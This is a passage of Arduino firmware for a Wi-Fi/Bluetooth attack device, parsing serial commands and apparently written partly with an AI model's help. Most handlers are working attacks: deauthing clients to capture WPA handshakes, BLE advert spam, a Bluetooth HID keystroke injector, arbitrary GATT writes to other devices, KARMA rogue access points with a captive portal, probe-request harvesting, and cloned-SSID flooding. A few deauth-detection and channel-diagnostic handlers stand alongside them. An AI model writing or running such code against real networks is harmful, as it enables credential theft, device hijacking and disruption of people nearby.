        static char wb[800];   // BSS, not loop() stack: loop() already carries the whole dispatch
        webui_render(wb, sizeof(wb));
        Serial.println("WEBUI:DUMP<<<"); Serial.print(wb); Serial.println("\n>>>WEBUI:DUMP");
      }else{
        Serial1.println("WEBUI:usage START|STOP|DUMP");
      }
    }else if(readString.substring(0,3)=="LED"){
      // utility: LED <r> <g> <b> (0/1) | LED ON | LED OFF. OFF latches led_quiet (night mode: status
      // blinks stay dark too); ON / r g b clear it. The FAP drives OFF/ON on the night boundary (RTC).
      String sub = readString.substring(3); sub.trim();
      if(sub.startsWith("OFF")){
        led_quiet = true;
        led_w(LED_R, LOW); led_w(LED_G, LOW); led_w(LED_B, LOW);
        Serial.println("LED:off (quiet)"); Serial1.println("LED:off");
      }else if(sub.startsWith("ON")){
        led_quiet = false;   // resume normal status-driven LEDs (do NOT force white)
        Serial.println("LED:on (resume)"); Serial1.println("LED:on");
      }else{
        led_quiet = false;
        int s1 = sub.indexOf(' ');
        int s2 = (s1 >= 0) ? sub.indexOf(' ', s1 + 1) : -1;
        int r = (sub.length() > 0) ? sub.substring(0, s1 >= 0 ? s1 : sub.length()).toInt() : 0;
        int g = (s1 >= 0) ? sub.substring(s1 + 1, s2 >= 0 ? s2 : sub.length()).toInt() : 0;
        int b = (s2 >= 0) ? sub.substring(s2 + 1).toInt() : 0;
        led_w(LED_R, r ? HIGH : LOW);
        led_w(LED_G, g ? HIGH : LOW);
        led_w(LED_B, b ? HIGH : LOW);
        char m[28]; snprintf(m, sizeof(m), "LED:r%d g%d b%d", r ? 1 : 0, g ? 1 : 0, b ? 1 : 0);
        Serial.println(m); Serial1.println(m);
      }
    }else if(readString.substring(0,6)=="HSGRAB"){
      // P5 active: capture on <chan> while deauthing <bssid> to force a fresh 4-way.
      // Args: HSGRAB <chan> <bssid-12hex> [seconds]  (default 10s, max 60s).
      // CAVEAT: injection during promisc is unverified on this driver — if no EAPOL lands,
      // stop, deauth in STA mode for ~2s, then run CAPTURE (clients re-assoc in 1-3s).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      String bssid_hex = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1) : String("");
      int secs = (s3 > 0) ? readString.substring(s3+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      uint8_t bssid[6]; bool ok_bssid = hex_to_mac(bssid_hex, bssid);
      if(!ok_bssid){
        Serial.println("ERROR: HSGRAB needs <chan> <bssid-12hex> [secs]");
        Serial1.println("ERROR: HSGRAB needs <chan> <bssid-12hex> [secs]");
      }else{
        bool dry = (readString.indexOf("DRY") >= 0);  // HSGRAB <ch> <bssid> [secs] [DRY]
        hsg_start(bssid, ch, (uint32_t)secs * 1000u, false, dry);
        const char* m = dry ? "HSGRAB: armed (DRY, no deauth TX)" : "HSGRAB: armed";
        Serial.println(m); Serial1.println(m);
      }
    }else if(readString.substring(0,7)=="BLESCAN"){
      // P8: BLE scan. Args: BLESCAN [secs]  (default 5s, max 30s).
      int secs = readString.substring(8, readString.length()-1).toInt();
      if(secs < 1 || secs > 30) secs = 5;
      BLE.init();
      BLE.configScan()->setScanMode(GAP_SCAN_MODE_ACTIVE);
      BLE.configScan()->setScanInterval(500);
      BLE.configScan()->setScanWindow(250);
      BLE.configScan()->updateScanParams();
      BLE.setScanCallback(ble_scan_cb);
      BLEN_SET(0);   // reset after the callback is installed, before the scan can fire
      BLE.beginCentral(0);
      BLE.configScan()->startScan((uint32_t)secs * 1000u);
      ble_stream();
      BLE.end();
    }else if(readString.substring(0,10)=="BLEIBEACON"){
      // P9: advertise an iBeacon. Args: BLEIBEACON <uuid-32hex> <major> <minor> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int s4 = (s3 > 0) ? readString.indexOf(' ', s3+1) : -1;
      String uuid = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int major = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 0;
      int minor = (s3 > 0) ? readString.substring(s3+1, s4>0?s4:readString.length()-1).toInt() : 0;
      int secs = (s4 > 0) ? readString.substring(s4+1, readString.length()-1).toInt() : 10;
      if(secs < 1 || secs > 120) secs = 10;
      if(uuid.length() != 32){
        Serial.println("ERR:BLEIBEACON:uuid"); Serial1.println("ERR:BLEIBEACON:uuid");
      }else{
        uint8_t b[31]; uint8_t n = 0;
        b[n++]=0x02; b[n++]=0x01; b[n++]=0x06;                          // flags
        b[n++]=0x1A; b[n++]=0xFF; b[n++]=0x4C; b[n++]=0x00; b[n++]=0x02; b[n++]=0x15; // Apple iBeacon
        for(int i = 0; i < 16; i++) b[n++] = (uint8_t)strtoul(uuid.substring(i*2, i*2+2).c_str(), NULL, 16);
        b[n++]=(uint8_t)((major >> 8) & 0xFF); b[n++]=(uint8_t)(major & 0xFF);
        b[n++]=(uint8_t)((minor >> 8) & 0xFF); b[n++]=(uint8_t)(minor & 0xFF);
        b[n++]=0xC5; // tx power -59 dBm
        BLE.init();
        BLE.beginPeripheral();
        BLEAdvert* ad = BLE.configAdvert();
        ad->setAdvData(b, n);
        ad->startAdv();
        Serial.println("BLEIBEACON:on"); Serial1.println("BLEIBEACON:on");
        for(int i=0;i<secs;i++) delay(1000);
        ad->stopAdv();
        BLE.end();
        Serial.println("BLEIBEACON:off"); Serial1.println("BLEIBEACON:off");
      }
    }else if(readString.substring(0,6)=="BLEADV"){
      // P9: advertise raw adv-data bytes. Args: BLEADV <hex> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      String hex = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(secs < 1 || secs > 120) secs = 10;
      uint8_t buf[31]; uint8_t n = 0;
      for(int i = 0; i + 1 < (int)hex.length() && n < 31; i += 2)
        buf[n++] = (uint8_t)strtoul(hex.substring(i, i+2).c_str(), NULL, 16);
      if(n == 0){
        Serial.println("ERR:BLEADV:badhex"); Serial1.println("ERR:BLEADV:badhex");
      }else{
        BLE.init();
        BLE.beginPeripheral();
        BLEAdvert* ad = BLE.configAdvert();
        ad->setAdvData(buf, n);
        ad->startAdv();
        Serial.println("BLEADV:on"); Serial1.println("BLEADV:on");
        for(int i=0;i<secs;i++) delay(1000);
        ad->stopAdv();
        BLE.end();
        Serial.println("BLEADV:off"); Serial1.println("BLEADV:off");
      }
    }else if(readString.substring(0,7)=="BLESPAM"){
      // D2: rotate BLE advert payloads (Apple continuity / Swift Pair).
      // Args: BLESPAM <type 0=pp 1=action 2=airdrop 3=swift 4=all> [secs]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int type = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 4;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 30;
      if(type < 0 || type > 4) type = 4;
      if(secs < 1 || secs > 120) secs = 30;
      if(apActive) destroyAP();
      BLE.init();
      BLE.beginPeripheral();
      BLEAdvert* ad = BLE.configAdvert();
      uint8_t pkt[31];
      unsigned long end = millis() + (unsigned long)secs * 1000UL;
      uint8_t t = 0;
      while((long)(millis() - end) < 0) {
        uint8_t use = (type == 4) ? (uint8_t)(t % 4) : (uint8_t)type;
        uint8_t n = blespam_pkt(pkt, use);
        ad->setAdvData(pkt, n);
        ad->startAdv();
        delay(120);
        ad->stopAdv();
        t++;
      }
      BLE.end();
      String r = "BLESPAM:off " + String((unsigned)t);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,12)=="BLEGATTPROBE"){
      // P10: connect + enumerate GATT. Args: BLEGATTPROBE <aa:bb:..> [type 0=pub 1=rand]
      // Services/characteristics print to USB serial (SDK only exposes printServices()).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      String addr = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1) : String("");
      int at = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 1;
      if(addr.length() != 17){
        Serial.println("ERR:BLEGATTPROBE:addr"); Serial1.println("ERR:BLEGATTPROBE:addr");
      }else{
        BLE.init();
        BLE.beginCentral(0);
        char ab[18]; addr.toCharArray(ab, sizeof(ab));
        BLEConnect* conn = BLE.configConnection();
        Serial.println("GATT: connecting..."); Serial1.println("GATT: connecting...");
        T_GAP_REMOTE_ADDR_TYPE ta =
          (T_GAP_REMOTE_ADDR_TYPE)(at ? GAP_REMOTE_ADDR_LE_RANDOM : GAP_REMOTE_ADDR_LE_PUBLIC);
        T_GAP_REMOTE_ADDR_TYPE tb =
          (T_GAP_REMOTE_ADDR_TYPE)(at ? GAP_REMOTE_ADDR_LE_PUBLIC : GAP_REMOTE_ADDR_LE_RANDOM);
        bool cok = conn->connect(ab, ta, 6000);
        if(!cok) cok = conn->connect(ab, tb, 6000);  // retry with the other addr type
        if(cok){
          BLEClient* cl = BLE.addClient(0);
          for(int i = 0; i < 30 && !cl->connected(); i++) delay(100);
          cl->discoverServices();
          for(int i = 0; i < 50 && !cl->discoveryDone(); i++) delay(100);
          cl->printServices();  // service + characteristic UUIDs -> USB serial
          // Also stream the discovered tree to the Flipper so the host can show it
          // (printServices only writes to the SDK/USB log).
          for(uint8_t si = 0; si < cl->getServiceCount(); si++) {
            char line[96];
            snprintf(line, sizeof(line), "GATT:S|%s", cl->getServiceUuid(si));
            Serial.println(line); Serial1.println(line);
            for(uint8_t ci = 0; ci < cl->getCharacteristicCount(si); ci++) {
              char l2[96];
              snprintf(l2, sizeof(l2), "GATT:C|%s", cl->getCharacteristicUuid(si, ci));
              Serial.println(l2); Serial1.println(l2);
            }
          }
          conn->disconnect();
          Serial.println("GATT:done"); Serial1.println("GATT:done");
        }else{
          Serial.println("GATT:connect-failed"); Serial1.println("GATT:connect-failed");
        }
        BLE.end();
      }
    }else if(readString.substring(0,6)=="GATTRW"){
      // OFFENSIVE (owner-only): GATT read/write. GATTRW <addr> <svc-uuid> <char-uuid> [hexwrite]
      // Connects to the BLE device, finds the characteristic, writes the hex bytes if given, else
      // reads it. Touching a non-owned device -> owner validates LIVE. UNVERIFIED by assistant.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1 + 1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2 + 1) : -1;
      int s4 = (s3 > 0) ? readString.indexOf(' ', s3 + 1) : -1;
      String addr = (s1 > 0) ? readString.substring(s1 + 1, s2 > 0 ? s2 : readString.length() - 1) : String("");
      String svc  = (s2 > 0) ? readString.substring(s2 + 1, s3 > 0 ? s3 : readString.length() - 1) : String("");
      String chu  = (s3 > 0) ? readString.substring(s3 + 1, s4 > 0 ? s4 : readString.length() - 1) : String("");
      String whex = (s4 > 0) ? readString.substring(s4 + 1, readString.length() - 1) : String("");
      whex.trim();
      if(addr.length() < 17 || svc.length() == 0 || chu.length() == 0){
        Serial.println("ERROR: GATTRW <addr> <svc-uuid> <char-uuid> [hexwrite]"); Serial1.println("ERROR: GATTRW <addr> <svc-uuid> <char-uuid> [hexwrite]");
      }else{
        BLE.init(); BLE.beginCentral(0);
        char ab[18]; addr.toCharArray(ab, sizeof(ab));
        BLEConnect* conn = BLE.configConnection();
        bool cok = conn->connect(ab, GAP_REMOTE_ADDR_LE_PUBLIC, 6000);
        if(!cok) cok = conn->connect(ab, GAP_REMOTE_ADDR_LE_RANDOM, 6000);
        if(cok){
          BLEClient* cl = BLE.addClient(0);
          for(int i = 0; i < 30 && !cl->connected(); i++) delay(100);
          cl->discoverServices();
          for(int i = 0; i < 50 && !cl->discoveryDone(); i++) delay(100);
          BLERemoteService* s = cl->getService(svc.c_str());
          BLERemoteCharacteristic* c = s ? s->getCharacteristic(chu.c_str()) : NULL;
          if(!c){
            Serial.println("GATTRW:char-not-found"); Serial1.println("GATTRW:char-not-found");
          }else if(whex.length() >= 2){
            uint8_t wb[64]; int wl = 0;
            for(int i = 0; i + 1 < (int)whex.length() && wl < 64; i += 2)
              wb[wl++] = (uint8_t)strtoul(whex.substring(i, i + 2).c_str(), NULL, 16);
            bool wok = c->setData(wb, (uint16_t)wl);
            char m[40]; snprintf(m, sizeof(m), "GATTRW:write %s len=%d", wok ? "ok" : "fail", wl);
            Serial.println(m); Serial1.println(m);
          }else{
            uint8_t rb[64]; uint16_t rl = c->getData(rb, sizeof(rb));
            String hexs = ""; for(uint16_t i = 0; i < rl; i++){ char h[3]; snprintf(h, 3, "%02x", rb[i]); hexs += h; }
            String m = "GATTRW:read " + String((unsigned)rl) + ":" + hexs;
            Serial.println(m); Serial1.println(m);
          }
          conn->disconnect();
        }else{
          Serial.println("GATTRW:connect-failed"); Serial1.println("GATTRW:connect-failed");
        }
        BLE.end();
      }
    }else if(readString.substring(0,6)=="BADBLE"){
      // P11: BLE HID keyboard injection. Args: BADBLE [secs] [hex-payload]
      // Advertises as a HID keyboard; if a host connects, types the payload. LOW success:
      // modern hosts require pairing/confirmation and reject unauth HID peripherals.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int secs = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 30;
      if(secs < 1 || secs > 120) secs = 30;
      String phex = (s2 > 0) ? readString.substring(s2+1, readString.length()-1) : String("");
      char txt[96]; int tn = 0;
      for(int i = 0; phex[i] && phex[i+1] && tn < 95; i += 2) {
        int hi = hexnib(phex[i]), lo = hexnib(phex[i+1]);
        if(hi < 0 || lo < 0) break;
        txt[tn++] = (char)((hi << 4) | lo);
      }
      txt[tn] = 0;
      if(tn == 0) strcpy(txt, "Petrel says hi\n");
      ble_hidadv.clear();
      ble_hidadv.addFlags();
      ble_hidadv.addCompleteName("PETREL-KB");
      ble_hidadv.addAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);
      ble_hidadv.addCompleteServices(BLEUUID(HID_SERVICE_UUID));
      BLEHIDDev.init();
      BLE.init();
      BLE.configAdvert()->setAdvData(ble_hidadv);
      BLE.setDeviceName("PETREL-KB");
      BLE.setDeviceAppearance(GAP_GATT_APPEARANCE_HUMAN_INTERFACE_DEVICE);
      BLE.configSecurity()->setPairable(true);
      BLE.configSecurity()->setAuthFlags(GAP_AUTHEN_BIT_BONDING_FLAG);
      BLE.configServer(3);
      BLE.addService(BLEHIDDev.hidService());
      BLE.addService(BLEHIDDev.battService());
      BLE.addService(BLEHIDDev.devInfoService());
      BLE.beginPeripheral();
      Serial.println("BADBLE:on"); Serial1.println("BADBLE:on");
      uint32_t t0 = millis();
      bool typed = false;
      while (millis() - t0 < (uint32_t)secs * 1000u) {
        if (BLE.connected() && !typed) {
          ble_kbd.keyReleaseAll();
          delay(300);
          ble_kbd.keySequence(txt, 20);
          ble_kbd.keyReleaseAll();
          typed = true;
          Serial.println("BADBLE:typed"); Serial1.println("BADBLE:typed");
        }
        delay(200);
      }
      BLE.end();
      Serial.println("BADBLE:off"); Serial1.println("BADBLE:off");
    }else if(readString.substring(0,3)=="HOP"){
      // P1: channel hop. Args: HOP <interval_ms>  (0 = stop). Cycles 1..13.
      int ms = readString.substring(4, readString.length()-1).toInt();
      if (ms <= 0) {
        hopping = false;
      } else {
        hop_interval_ms = (ms < 100) ? 100 : ((ms > 5000) ? 5000 : (uint32_t)ms);
        hopping = true;
      }
      String r = String("HOP:") + (hopping ? "on " : "off ") + String(hopping ? (unsigned)hop_interval_ms : 0u);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,11)=="SNIFFDEAUTH"){
      // A5: count other people's deauth/disassoc frames (IDS).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      if(apActive) destroyAP();   // monitor capture needs the softAP torn down
      ids_n = 0;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_ids_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0, NULL, 0);
      ids_stream(ch);
    }else if(readString.substring(0,10)=="PROBESNIFF"){
      // A1: harvest probe requests on <chan> for [secs] -> the PNL of nearby devices.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 6;
      int secs = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 10;
      if(ch < 1 || ch > 165) ch = 6;
      if(secs < 1 || secs > 60) secs = 10;
      if(apActive) destroyAP();   // monitor capture needs the softAP torn down
      probe_n = 0;
      wext_set_channel(WLAN0_NAME, ch);
      wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_probe_cb, 0);
      for(int i=0;i<secs;i++) delay(1000);
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      probe_stream(ch);
    }else if(readString.substring(0,8)=="RECFETCH"){
      // F5: dump the recorded actions as REC:<line>, then RECDONE:<n> so the app can save them.
      for(int i = 0; i < rec_n; i++) {
        String r = String("REC:");
        r += rec_lines[i];
        Serial.println(r); Serial1.println(r);
      }
      String d = "RECDONE:" + String((unsigned)rec_n);
      Serial.println(d); Serial1.println(d);
    }else if(readString.substring(0,8)=="RECCLEAR"){
      rec_n = 0;
      Serial.println("RECCLEAR:ok"); Serial1.println("RECCLEAR:ok");
    }else if(readString.substring(0,3)=="REC" && readString.charAt(3)==' '){
      // F5: REC <0|1> - record the commands the app sends. The charAt guard keeps RECFETCH and
      // RECCLEAR out of here (a bare "REC" prefix would otherwise swallow them).
      int s1 = readString.indexOf(' ');
      int on = (s1 > 0) ? readString.substring(s1+1, readString.length()-1).toInt() : 1;
      rec_on = (on != 0);
      if(rec_on) rec_n = 0;      // a fresh recording always starts clean
      String r = String("RECCTL:") + (rec_on ? "on" : "off") + " n=" + String((unsigned)rec_n);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,8)=="TRAPSTAT"){
      // C1: read-only status (a bare "TRAP" means "trap on", so a query needs its own name).
      int portalNow = 0;
      web_lwip_in_tcpip(portal_read_cb, &portalNow);   // `portal` is rotated in the tcpip thread
      String r = String("TRAPSTAT:") + (trap_on ? "on" : "off") + " ch=" + String(karma_chan) +
                 " ap=" + String(apActive ? trap_ssid : "-") +
                 " portal=" + String(portalNow) +
                 " seen=" + String((unsigned)KSEEN_LOAD());
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,4)=="TRAP" && readString.charAt(4)==' '){
      // C1: KARMA -> Trap. Args: TRAP <0|1> [chan]. Like KARMA but the first requested SSID is
      // cloned as a real softAP (portal served), so the client can actually associate.
      // The charAt guard keeps "TRAPSTAT"/"TRAPCTL" out of here - without it a status query would
      // re-arm the trap and destroy the AP that is already up.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int on = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 1;
      int ch = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : karma_chan;
      if(ch >= 1 && ch <= 165) karma_chan = ch;
      trap_on = (on != 0);
      trap_armed = true;
      trap_ssid[0] = 0;
      // Quiesce the producer BEFORE draining: a callback already past its entry check can still
      // publish, so draining first would let a stale request survive into the new mode.
      KON_STORE(false);
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);
      while (karma_take()) {}
      if(trap_on) {
        if(apActive) destroyAP();
        wext_set_channel(WLAN0_NAME, karma_chan);
        KON_STORE(true);
        wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2*/, promisc_karma_cb, 0);
      } else if(apActive) { destroyAP(); apActive = false; }
      String r = String("TRAPCTL:") + (trap_on ? "on" : "off") + " ch=" + String(karma_chan) +
                 " ap=" + String(apActive ? trap_ssid : "-");
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,9)=="KARMALIST"){
      // B1: report the SSIDs the responder has seen, so the host can show them live.
      // NOTE: this must be tested BEFORE the "KARMA" handler below - "KARMALIST" starts with
      // "KARMA", so otherwise it gets swallowed and re-enables the responder on every poll.
      int kn = KSEEN_LOAD();
      String r = "KARMALIST:" + String((unsigned)kn);
      for(int i = 0; i < kn; i++) r += String("|") + karma_seen[i];
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,5)=="KARMA"){
      // B1: KARMA responder. Args: KARMA <0|1> [chan]
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int on = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 1;
      int ch = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : karma_chan;
      if(ch >= 1 && ch <= 165) karma_chan = ch;
      KON_STORE(false);
      wifi_set_promisc(0 /*RTW_PROMISC_DISABLE*/, NULL, 0);   // quiesce before draining
      while (karma_take()) {}
      if(on != 0) {
        if(apActive) destroyAP();
        wext_set_channel(WLAN0_NAME, karma_chan);
        KON_STORE(true);
        wifi_set_promisc(3 /*RTW_PROMISC_ENABLE_2: all 802.11 frames*/, promisc_karma_cb, 0);
      }
      String r = String("KARMA:") + (KON_LOAD() ? "on" : "off") + " ch=" + String(karma_chan) +
                 " seen=" + String((unsigned)KSEEN_LOAD());
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,9)=="BEACONOFF"){
      // Stop every beacon/SSID-flood mode. Nothing else in the firmware turned all of them off
      // (SCAN cleared randomSSID/rickroll, STOP only ghostSpam), so a running flood could not be
      // stopped from the app at all.
      randomSSID = false; rickroll = false; ghostSpam = false; ssid = "";
      String r = "BEACONOFF:ok";
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,5)=="TXRAW"){
      // DIAG: TXRAW <hexbytes> -> push an arbitrary 802.11 frame through wifi_tx_raw_frame.
      // Lets us bisect live (no rebuild) which byte in a beacon-ish frame makes the SDK spin.
      int s1 = readString.indexOf(' ');
      String hex = (s1 > 0) ? readString.substring(s1+1, readString.length()-1) : String("");
      wext_set_channel(WLAN0_NAME, 6);   // DIAG: raw TX only completes on a tuned channel
      int n = tx_raw_hex(hex.c_str());
      String r = "TXRAW:" + String((unsigned)n);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,7)=="CHANSET"){
      // Which channels does this build's channel set actually contain?
      // wext_set_channel() accepts a 5 GHz number and wext_get_channel() reads it back, but a raw TX
      // on a channel the set does not contain never completes - the SDK spins inside its TX path and
      // the board goes silent. The SDK's own wifi_get_ch_from_channel_set() is not in this build's
      // archive (link error), so the same private ioctl is issued directly; wifi_get_channel_plan()
      // says which plan is being consulted. No TX here: safe on any channel.
      uint8_t plan = 0xFF;
      wifi_get_channel_plan(&plan);
      int ch = readString.substring(8).toInt();
      if(ch < 1 || ch > 196) ch = 1;
      char q[24];
      snprintf(q, sizeof(q), "get_ch_from_set %x", ch);   // the SDK formats this in hex
      int in_set = wext_private_command_with_retval(WLAN0_NAME, q, q, sizeof(q));
      String r = String("CHANSET:req=") + String(ch) + " plan=0x" + String((unsigned)plan, HEX) +
                 " in_set=" + String(in_set) + " idx=" + String(q) +
                 " band=" + String(wifi_get_band_type());
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,8)=="CHANPLAN"){
      // CHANPLAN <n> -> wifi_change_channel_plan() (driver call, present in the archive) then read
      // the plan back. No TX: this is how we try to make a 5 GHz channel belong to the set.
      int want = readString.substring(9).toInt();
      uint8_t before = 0xFF, after = 0xFF;
      wifi_get_channel_plan(&before);
      int rc = wifi_change_channel_plan((uint8_t)want);
      delay(50);
      wifi_get_channel_plan(&after);
      String r = String("CHANPLAN:want=0x") + String((unsigned)want, HEX) + " rc=" + String(rc) +
                 " before=0x" + String((unsigned)before, HEX) + " after=0x" + String((unsigned)after, HEX);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,8)=="TX5PROBE"){
      // Deliberate 5 GHz experiment, deliberately NOT behind tx_raw_chan_ok(): the whole point is to
      // find out whether a raw TX on a 5 GHz channel can ever complete. It sends ONE beacon. If the
      // line below comes back, 5 GHz raw TX works. If the board goes silent, it does not - and that
      // silence is the result (recover with a flash, which also resets the board).
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int ch = (s1 > 0) ? readString.substring(s1+1, s2>0?s2:readString.length()-1).toInt() : 36;
      int cnt = (s2 > 0) ? readString.substring(s2+1, readString.length()-1).toInt() : 1;
      if(!is_valid_tx_channel(ch)) ch = 36;
      if(cnt < 1 || cnt > 200) cnt = 1;
      if(apActive) destroyAP();
      uint8_t src[6] = {0x00,0xE0,0x4C,0x11,0x22,0x33};
      for(int i = 0; i < cnt; i++) {
        wext_set_channel(WLAN0_NAME, ch);   // tune immediately before every frame, as the floods do
        tx_beacon_raw(src, TX_BCAST, "PETREL5P", 0x80, ch);
        if((i & 15) == 15) delay(2);
      }
      String r = String("TX5PROBE:ok ch=") + String(ch) + " n=" + String(cnt);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,4)=="CHAN" && (readString.length() <= 4 ||
             readString.charAt(4) == ' ' || readString.charAt(4) == '\n' || readString.charAt(4) == '\r')){
      // (5th char guarded so CHANINTERF is not shadowed by this "CHAN" diag.)
      // F3 diag: CHAN <n> -> tune the radio and report what it actually did.
      // Everything that transmits (deauth/CSA/BTM/beacon) only completes when the radio is tuned
      // to the target's channel, and wext_set_channel() silently ignores a channel the current
      // band table does not contain. So "does 5 GHz injection work?" cannot be answered from the
      // FAP side - the channel has to be read back, together with the band the SDK thinks it is
      // on. got != req means the request was refused (5 GHz not available on this part/band table).
      int ch = readString.substring(5).toInt();
      if(ch < 1 || ch > 196) ch = 1;
      if(apActive) destroyAP();
      int setres = wext_set_channel(WLAN0_NAME, ch);
      delay(50);
      uint8_t got = 0;
      int getres = wext_get_channel(WLAN0_NAME, &got);
      // NOTE: do not read "cap=" as the current band. wifi_get_band_type() combines the channel
      // plan with the chip's capability check and never looks at the tuned channel, so a constant
      // value is expected. 2 = WL_BAND_2_4G_5G_BOTH (dual-band capable), 0 = 2.4G only, 1 = 5G
      // only, 3 = the channel plan and the chip disagree. Real band switching happens lower down
      // in the driver (set_channel_bwmode -> phy_switch_wireless_band_8721d), so the only proof
      // that 5 GHz actually transmits is a receiver - see tools/mac_wifiscan.swift.
      String r = String("CHAN:req=") + String(ch) + " got=" + String((int)got) +
                 " set=" + String(setres) + " get=" + String(getres) +
                 " cap=" + String(wifi_get_band_type());
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,8)=="TXBEACON"){
      // DIAG (B6 fix): TXBEACON <typehex> <count> [ssid] -> raw beacon frames with a settable
      // frame-control byte, so we can prove which frame type/the old SDK beacon path was hanging.
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1+1) : -1;
      int s3 = (s2 > 0) ? readString.indexOf(' ', s2+1) : -1;
      int s4 = (s3 > 0) ? readString.indexOf(' ', s3+1) : -1;
      int ftype = (s1 > 0) ? (int)strtol(readString.substring(s1+1, s2>0?s2:readString.length()-1).c_str(), NULL, 16) : 0x80;
      int cnt = (s2 > 0) ? readString.substring(s2+1, s3>0?s3:readString.length()-1).toInt() : 1;
      String ssid = (s3 > 0) ? readString.substring(s3+1, s4>0?s4:readString.length()-1) : String("DIAG");
      int chan = (s4 > 0) ? readString.substring(s4+1, readString.length()-1).toInt() : 5;
      if(cnt < 1 || cnt > 40) cnt = 1;
      uint8_t src[6] = {0x00,0xE0,0x4C,0x01,0x02,0x03};
      for(int i=0;i<cnt;i++) tx_beacon_raw(src, TX_BCAST, ssid.c_str(), (uint8_t)ftype, chan);
      String r = "TXBEACON:" + String(ftype, HEX) + ":" + String((unsigned)cnt);
      Serial.println(r); Serial1.println(r);
    }else if(readString.substring(0,10)=="CHANINTERF"){
      // OFFENSIVE (owner-only, RF-isolated lab): channel interference — beacon a cloned SSID across
      // MANY channels so scanners/clients see the fake on every band. Broadcast. Bounded + blocking.
      // Args: CHANINTERF <ssid> [secs]   (UNVERIFIED by assistant; owner validates LIVE)
      int s1 = readString.indexOf(' ');
      int s2 = (s1 > 0) ? readString.indexOf(' ', s1 + 1) : -1;
      String ssid = (s1 > 0) ? readString.substring(s1 + 1, s2 > 0 ? s2 : readString.length() - 1) : String("");
      int secs = (s2 > 0) ? readString.substring(s2 + 1, readString.length() - 1).toInt() : 10;
      if(secs < 1 || secs > 30) secs = 10;
      if(ssid.length() == 0){
        Serial.println("ERROR: CHANINTERF needs <ssid> [secs]"); Serial1.println("ERROR: CHANINTERF needs <ssid> [secs]");
